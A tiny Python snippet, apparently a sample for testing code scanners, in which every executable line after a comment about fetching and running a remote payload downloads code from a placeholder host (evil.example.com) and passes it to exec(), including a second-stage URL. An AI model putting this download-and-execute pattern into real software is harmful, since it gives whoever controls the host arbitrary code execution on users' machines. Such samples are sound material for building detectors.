import requests
import urllib.request
from urllib.request import urlopen

# Fetch and execute remote payload
payload = requests.get('https://evil.example.com/payload').text
exec(requests.get('https://evil.example.com/payload').text)
exec(urllib.request.urlopen('https://evil.example.com/payload').read())
exec(urlopen('https://evil.example.com/stage2').read())
